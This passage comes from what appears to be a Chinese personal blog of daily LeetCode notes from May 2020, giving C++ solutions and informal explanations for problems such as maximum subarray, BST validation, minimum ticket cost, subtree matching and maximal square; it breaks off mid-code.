<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        set&lt;<span class="type">char</span>&gt; st;</span><br><span class="line">        <span class="comment">//这里我们使用集合来判断是否出现相同字符</span></span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//确定开头为-1  这里是未来后面rk+1 做准备</span></span><br><span class="line">        <span class="comment">//为了 0 &lt; 1  -1 + 1 =0 &lt; 1</span></span><br><span class="line">        <span class="type">int</span> rk = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//左边开始增加</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>)&#123;</span><br><span class="line">                st.<span class="built_in">erase</span>(s[i<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断 下一个是不是重复了  存在是1  非 则是0  意思就是为重复 直接脱离循环</span></span><br><span class="line">            <span class="keyword">while</span>(rk+<span class="number">1</span>&lt;n&amp;&amp; ! st.<span class="built_in">count</span>(s[rk+<span class="number">1</span>]))&#123;</span><br><span class="line">                st.<span class="built_in">insert</span>(s[rk+<span class="number">1</span>]);</span><br><span class="line">                rk++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ans = <span class="built_in">max</span>(ans,rk-i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-03"><a href="#2020-05-03" class="headerlink" title="2020.05.03"></a>2020.05.03</h3><h4 id="53-最大子序和"><a href="#53-最大子序和" class="headerlink" title="53. 最大子序和"></a><a class="link"   href="https://leetcode-cn.com/problems/maximum-subarray/" >53. 最大子序和<i class="fas fa-external-link-alt"></i></a></h4><p>给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>
<p>示例:</p>
<p>输入: [-2,1,-3,4,-1,2,1,-5,4],<br>输出: 6<br>解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</p>
<p>今天题目，一眼就看的出标准的动态规划</p>
<p>那么动态规划题目一般怎么写呢？【得查查</p>
<p>动态规划类问题常规的解决方法是：</p>
<ul>
<li>问题拆解，找到问题的定义</li>
<li>状态定义</li>
<li>递归方程求解</li>
<li>实现</li>
</ul>
<p>我们看这道题目，分析情况，自底向上</p>
<p>。。【我不知道怎么说啊。。。</p>
<p>直接看代码吧</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">        dp.<span class="built_in">push_back</span>(nums[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            dp.<span class="built_in">push_back</span>(<span class="built_in">max</span>(dp[i<span class="number">-1</span>]+nums[i],nums[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(dp.<span class="built_in">begin</span>(), dp.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> dp[nums.<span class="built_in">size</span>()<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-05"><a href="#2020-05-05" class="headerlink" title="2020.05.05"></a>2020.05.05</h3><h4 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a class="link"   href="https://leetcode-cn.com/problems/validate-binary-search-tree/" >98. 验证二叉搜索树<i class="fas fa-external-link-alt"></i></a></h4><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p>
<p>假设一个二叉搜索树具有如下特征：</p>
<p>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。<br>示例 1:</p>
<p>输入:<br>    2<br>   &#x2F; <br>  1   3<br>输出: true<br>示例 2:</p>
<p>输入:<br>    5<br>   &#x2F; <br>  1   4<br>     &#x2F; <br>    3   6<br>输出: false<br>解释: 输入为: [5,1,4,null,null,3,6]。<br>     根节点的值为 5 ，但是其右子节点值为 4 。</p>
<hr>
<p>记住二叉搜索树有什么特点</p>
<p>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。【注意没有等于</p>
<p>两种方法： </p>
<h4 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h4><p>思路：</p>
<p>我们要知道 对于一个二叉搜索树，任何一个节点，它的左子树小于其，它的右子树大于其。</p>
<p>也就是说，我们可以这么认为，root节点是左子树的上界，是其右子树的下界。</p>
<p>那么我们只要遍历整颗树，判断他是否满足这个性质就可以了。</p>
<p>理一下递归方程：</p>
<p>这个递归函数的作用： 判断这个值是否目前节点是否在其区间内，是的话返回true</p>
<p>递归出口：如果root为空，返回true</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//这里需要我们拿取最小最大值，不要用int</span></span><br><span class="line">        <span class="comment">//int的范围会小了一点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isBST</span>(root,LLONG_MIN,LLONG_MAX);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里函数  我们也要用long long</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBST</span><span class="params">(TreeNode* root,<span class="type">long</span> <span class="type">long</span> min,<span class="type">long</span> <span class="type">long</span> max)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)<span class="comment">//到了根节点</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val&lt;=min || root-&gt;val &gt;=max)<span class="comment">//这个值不在范围内</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isBST</span>(root-&gt;left,min,root-&gt;val)&amp;&amp;<span class="built_in">isBST</span>(root-&gt;right,root-&gt;val,max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>我们知道，对于二叉搜索树，其中序遍历得到的值是递增的</p>
<p>那么，我们只需要获取中序遍历值，然后判断递增不就好了√</p>
<p>那么最笨的方法就是先获取中序遍历数组，再判断是否有序。</p>
<p>但是还有更好的——变遍历边判断！</p>
<p>看代码！</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre = LLONG_MIN;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//该递归方程的作用：可以判断本树是否为二叉搜索树</span></span><br><span class="line">        <span class="comment">//如果我是空的 返回真</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//根据中序遍历</span></span><br><span class="line">        <span class="comment">//我们从左子树开始判断是否为二叉搜索树</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">isValidBST</span>(root-&gt;left))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//左 根 右  现在判断根的情况</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val  &lt;= pre)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//给pre——前面一个值 进行更新</span></span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">        <span class="comment">//现在是右子树</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isValidBST</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>很难，说实话，我觉得我不够透彻。周末再写一遍这道题目吧</p>
<h3 id="2020-05-06"><a href="#2020-05-06" class="headerlink" title="2020.05.06"></a>2020.05.06</h3><h4 id="983-最低票价"><a href="#983-最低票价" class="headerlink" title="983. 最低票价"></a><a class="link"   href="https://leetcode-cn.com/problems/minimum-cost-for-tickets/" >983. 最低票价<i class="fas fa-external-link-alt"></i></a></h4><p>在一个火车旅行很受欢迎的国度，你提前一年计划了一些火车旅行。在接下来的一年里，你要旅行的日子将以一个名为 days 的数组给出。每一项是一个从 1 到 365 的整数。</p>
<p>火车票有三种不同的销售方式：</p>
<p>一张为期一天的通行证售价为 costs[0] 美元；<br>一张为期七天的通行证售价为 costs[1] 美元；<br>一张为期三十天的通行证售价为 costs[2] 美元。<br>通行证允许数天无限制的旅行。 例如，如果我们在第 2 天获得一张为期 7 天的通行证，那么我们可以连着旅行 7 天：第 2 天、第 3 天、第 4 天、第 5 天、第 6 天、第 7 天和第 8 天。</p>
<p>返回你想要完成在给定的列表 days 中列出的每一天的旅行所需要的最低消费。</p>
<p>示例 1：</p>
<p>输入：days &#x3D; [1,4,6,7,8,20], costs &#x3D; [2,7,15]<br>输出：11<br>解释：<br>例如，这里有一种购买通行证的方法，可以让你完成你的旅行计划：<br>在第 1 天，你花了 costs[0] &#x3D; $2 买了一张为期 1 天的通行证，它将在第 1 天生效。<br>在第 3 天，你花了 costs[1] &#x3D; $7 买了一张为期 7 天的通行证，它将在第 3, 4, …, 9 天生效。<br>在第 20 天，你花了 costs[0] &#x3D; $2 买了一张为期 1 天的通行证，它将在第 20 天生效。<br>你总共花了 $11，并完成了你计划的每一天旅行。<br>示例 2：</p>
<p>输入：days &#x3D; [1,2,3,4,5,6,7,8,9,10,30,31], costs &#x3D; [2,7,15]<br>输出：17<br>解释：<br>例如，这里有一种购买通行证的方法，可以让你完成你的旅行计划：<br>在第 1 天，你花了 costs[2] &#x3D; $15 买了一张为期 30 天的通行证，它将在第 1, 2, …, 30 天生效。<br>在第 31 天，你花了 costs[0] &#x3D; $2 买了一张为期 1 天的通行证，它将在第 31 天生效。<br>你总共花了 $17，并完成了你计划的每一天旅行。</p>
<p>提示：</p>
<p>1 &lt;&#x3D; days.length &lt;&#x3D; 365<br>1 &lt;&#x3D; days[i] &lt;&#x3D; 365<br>days 按顺序严格递增<br>costs.length &#x3D;&#x3D; 3<br>1 &lt;&#x3D; costs[i] &lt;&#x3D; 1000</p>
<hr>
<p>这道题目，直接说我不会做，看人家题目解析，看了好久才明白。</p>
<p>但是又不能说很懂。</p>
<p>我们在自己旅行上花的价钱最少，</p>
<p>三种情况</p>
<p>在本日买了一天的票，至此花费的总价格</p>
<p>在七天前买了七天的票，到现在花费的总价钱</p>
<p>在三十天之前买了三十天的票，到现在花费的总价格</p>
<p>然后决定最小值当作我此刻的最好的买票方式</p>
<p>然后代码就出来了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mincostTickets</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; days, vector&lt;<span class="type">int</span>&gt;&amp; costs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(days.<span class="built_in">size</span>()==<span class="number">0</span> || costs.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(days[days.size()<span class="number">-1</span>]+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">//给不旅游的时间赋予 0  给旅游的时间赋予max</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;days.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            dp[days[i]] = INT_MAX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//书写dp数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;dp.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i]=dp[i<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            一开始我很疑惑，如果我那天就已经买了七天的票</span></span><br><span class="line"><span class="comment">            那么在我计算dp[i]的时候，又写dp[i-7]+cost[2]不是多买了一次吗</span></span><br><span class="line"><span class="comment">            但是仔细看这个dp方程  在前面的dp数组中，只可能自己买了1天，或者前辈买了7天</span></span><br><span class="line"><span class="comment">            【对于小于7 小于30 的情况另外算</span></span><br><span class="line"><span class="comment">            【小于7 小于 30 的时候，因为最小化的缘故，可以【我也不知道。。</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="type">int</span> n1 = dp[i<span class="number">-1</span>] + costs[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> n2 = i&gt;<span class="number">7</span>?dp[i<span class="number">-7</span>]+costs[<span class="number">1</span>]:costs[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> n3 = i&gt;<span class="number">30</span>?dp[i<span class="number">-30</span>]+costs[<span class="number">2</span>]:costs[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">            dp[i] = <span class="built_in">min</span>(<span class="built_in">min</span>(n1,n2),n3);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[dp.<span class="built_in">size</span>()<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="2020-05-07"><a href="#2020-05-07" class="headerlink" title="2020.05.07"></a>2020.05.07</h3><h4 id="572-另一个树的子树"><a href="#572-另一个树的子树" class="headerlink" title="572. 另一个树的子树"></a><a class="link"   href="https://leetcode-cn.com/problems/subtree-of-another-tree/" >572. 另一个树的子树<i class="fas fa-external-link-alt"></i></a></h4><p>给定两个非空二叉树 s 和 t，检验 s 中是否包含和 t 具有相同结构和节点值的子树。s 的一个子树包括 s 的一个节点和这个节点的所有子孙。s 也可以看做它自身的一棵子树。</p>
<p>示例 1:<br>给定的树 s:</p>
<pre><code> 3
/ \
</code></pre>
<p>   4   5<br>  &#x2F; <br> 1   2<br>给定的树 t：</p>
<p>   4<br>  &#x2F; <br> 1   2<br>返回 true，因为 t 与 s 的一个子树拥有相同的结构和节点值。</p>
<p>示例 2:<br>给定的树 s：</p>
<pre><code> 3
/ \
</code></pre>
<p>   4   5<br>  &#x2F; <br> 1   2<br>    &#x2F;<br>   0<br>给定的树 t：</p>
<p>   4<br>  &#x2F; <br> 1   2<br>返回 false。</p>
<hr>
<p>分析：</p>
<p>简单题，但是可以不简单的来写。题解有三种方法</p>
<p>暴力破解		利用前序遍历	利用树哈希</p>
<p>首先暴力破解说说【其他不说了，kmp手写我傻了</p>
<p>我们利用对主树的每一个节点遍历是否和目标树是相同的</p>
<p>【讲真我听起来就觉得它的时间复杂度很高。所以我就直接否定了暴力破解</p>
<p>【结果爆破还真行。。</p>
<p>理一下我们对于爆破的思路</p>
<p>1、遍历主树</p>
<p>2、对每个主树的节点当作数根节点和目标树比较——也就是比较树相等</p>
<p>那么再分别看看这两个步骤</p>
<p>遍历主树——</p>
<p>首先看本节点是否相等 如果相等那么进入树相等判断</p>
<p>之后判断本节点的左节点和右节点</p>
<p>检查树相等——</p>
<p>该节点是否相等</p>
<p>该节点的左节点是否相等</p>
<p>该节点的右节点是否相等</p>
<p>​	递归出口 都为空返回true</p>
<p>那么代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力破解做法：</span></span><br><span class="line"><span class="comment">    循环试探每一个节点作为根节点是否和目标树相同 </span></span><br><span class="line"><span class="comment">    那么我们循环每一个s树的节点试探</span></span><br><span class="line"><span class="comment">    每一个节点都和目标子树进行判断</span></span><br><span class="line"><span class="comment">    两个函数  一个递归本树  一个判断相同</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(TreeNode*s1,TreeNode *t1)</span></span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        如何判断相同呢？</span></span><br><span class="line"><span class="comment">        递归：</span></span><br><span class="line"><span class="comment">            1、本节点是不是相同 </span></span><br><span class="line"><span class="comment">            2、左子树是不是相同</span></span><br><span class="line"><span class="comment">            3、右子树是不是相同</span></span><br><span class="line"><span class="comment">        递归出口： 如果为两节点值为空，贼退出</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//这个是递归出口</span></span><br><span class="line">        <span class="keyword">if</span>(s1==<span class="literal">nullptr</span> &amp;&amp; t1==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//如果出现有一个为空 就不可能指向数值</span></span><br><span class="line">        <span class="keyword">if</span>(s1==<span class="literal">nullptr</span> || t1 == <span class="literal">nullptr</span> || (s1-&gt;val != t1-&gt;val))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(s1-&gt;right,t1-&gt;right) &amp;&amp; <span class="built_in">check</span>(s1-&gt;left,t1-&gt;left);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(TreeNode* ss,TreeNode* tt)</span></span>&#123;</span><br><span class="line">        <span class="comment">//因为我们后面会递归主树的各个节点</span></span><br><span class="line">        <span class="comment">//那么某个节点的左右节点是空节点 就不存在左右节点了</span></span><br><span class="line">        <span class="comment">//所以当进来的ss节点是空节点的时候，直接返回false</span></span><br><span class="line">        <span class="keyword">if</span>(ss==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(ss,tt) || <span class="built_in">dfs</span>(ss-&gt;left,tt) || <span class="built_in">dfs</span>(ss-&gt;right,tt);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSubtree</span><span class="params">(TreeNode* s, TreeNode* t)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dfs</span>(s,t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>一个小tips、如果存在指向左右节点的操作</p>
<p>一定要判断是否本节点为空。如果为空，就不可以进行指向左右节点的操作</p>
<p>这会出现越界的问题。</p>
<p>分析一下时间复杂度：</p>
<p>s树每一个节点都需要访问一次——</p>
<p>树相等操作时，最大的是 t树的每一个节点都访问一次——</p>
<p>那么 时间复杂度大概是O(|s|*|t|)</p>
<p>空间复杂度</p>
<p><strong>递归算法空间复杂度：递归深度n*每次递归所要的辅助空间，如果每次递归所需要的辅助空间为常数，则递归空间复杂度o（n）。</strong></p>
<p>那么 看遍历主树的空间复杂度为 s树的深度</p>
<p>树相同递归中的空间复杂度为t树的深度</p>
<p>两个递归的最大的空间消耗 就是这个程序的空间复杂度 即O(max{ s, t})</p>
]]></content>
      <categories>
        <category>leetcode——每日一题</category>
      </categories>
  </entry>
  <entry>
    <title>leetcode_03</title>
    <url>/2020/05/08/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-03/</url>
    <content><![CDATA[<h3 id="2020-05-08"><a href="#2020-05-08" class="headerlink" title="2020.05.08"></a>2020.05.08</h3><h4 id="221-最大正方形"><a href="#221-最大正方形" class="headerlink" title="221. 最大正方形"></a><a class="link"   href="https://leetcode-cn.com/problems/maximal-square/" >221. 最大正方形<i class="fas fa-external-link-alt"></i></a></h4><p>在一个由 0 和 1 组成的二维矩阵内，找到只包含 1 的最大正方形，并返回其面积。</p>
<span id="more"></span>

<p><strong>示例:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line"></span><br><span class="line">1 0 1 0 0</span><br><span class="line">1 0 1 1 1</span><br><span class="line">1 1 1 1 1</span><br><span class="line">1 0 0 1 0</span><br><span class="line"></span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>

<hr>
<p>又是看题解看的懂，自己就是写不出。。</p>
<p>好吧，唔，服气。</p>
<p>爆破是可以的，但是懒得看。</p>
<p>直接dp解决吧。emmm，具体思想我觉得关键在动态规划方程</p>
<p>直接看代码吧</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            动态规划</span></span><br><span class="line"><span class="comment">            规划方程 上 左 左上最小值加一</span></span><br><span class="line"><span class="comment">            首先 我们dp数组 保存正方形右下角在我这里的宽长</span></span><br><span class="line"><span class="comment">            然后 递归原来的数组</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//利用||运算的短路规则</span></span><br><span class="line">        <span class="keyword">if</span>(matrix.<span class="built_in">size</span>() == <span class="number">0</span> || matrix[<span class="number">0</span>].<span class="built_in">size</span>() == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> row = matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//当这个vector是空的时候，就不能访问matrix[0] 这会溢出的</span></span><br><span class="line">        <span class="type">int</span> col = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//return col;</span></span><br><span class="line">        <span class="type">int</span> maxsize = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//这里的初始化很经典</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(row,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;row;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j&lt;col;j++)&#123;</span><br><span class="line">                <span class="comment">//遇到1   这里是字符 不是数字</span></span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">                    <span class="comment">//确保等于1</span></span><br><span class="line">                    <span class="keyword">if</span>(i==<span class="number">0</span> || j==<span class="number">0</span>)</span><br><span class="line">                        dp[i][j]=<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="comment">//dp方程  取左边 上边 左上最小＋1</span></span><br><span class="line">                        dp[i][j]=<span class="built_in">min</span>(<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]),dp[i][j<span class="number">-1</span>])+<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                maxsize = <span class="built_in">max</span>(maxsize,dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxsize*maxsize;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-09"><a href="#2020-05-09" class="headerlink" title="2020.05.09"></a>2020.05.09</h3><p>今天的题目太简单了。。没什么意思就不写在这里</p>
<p>——就是手写平方根</p>
<h3 id="2020-05-10"><a href="#2020-05-10" class="headerlink" title="2020.05.10"></a>2020.05.10</h3><h4 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a><a class="link"   href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/" >236. 二叉树的最近公共祖先<i class="fas fa-external-link-alt"></i></a></h4><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p>
<p>例如，给定如下二叉树:  root &#x3D; [3,5,1,6,2,0,8,null,null,7,4]</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/15/binarytree.png"
                      alt="img"
                ></p>
<p>示例 1:</p>
<p>输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 1<br>输出: 3<br>解释: 节点 5 和节点 1 的最近公共祖先是节点 3。<br>示例 2:</p>
<p>输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 4<br>输出: 5<br>解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。</p>
<hr>
<p>今天的题目 有意思</p>
<p>有两种解法。但是不是很想写，就写写第一种吧</p>
<h4 id="递归处理"><a href="#递归处理" class="headerlink" title="递归处理"></a>递归处理</h4><p>首先 我们这个函数的功能是：找到在此根节点下的父节点</p>
<p>那么就有几种情况出现</p>
<p>1、此根节点为某一个值——最大父节点为这个</p>
<p>2、此根节点为空——返回空</p>
<p>3、获取左右节点 如果左右节点都是空 说明左子树右子树都没有我们的那两个值</p>
<p>4、左右节点某一支为空，某一支不为空。为空说明该子数没有发现它</p>
<p>5、最后 两个子树都不为空 那么返回本根节点 </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        首先 如果本节点是其中之一，则直接返回该节点为父亲</span></span><br><span class="line"><span class="comment">        否则 到左右节点 如果 左右节点得到的值不是空 那么表示左右节点都有一个值</span></span><br><span class="line"><span class="comment">        那么返回本节点</span></span><br><span class="line"><span class="comment">        如果只有左节点，那么说明左节点里有父亲</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root == q || root == p)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode * left1 = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">        TreeNode * right1 = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">        <span 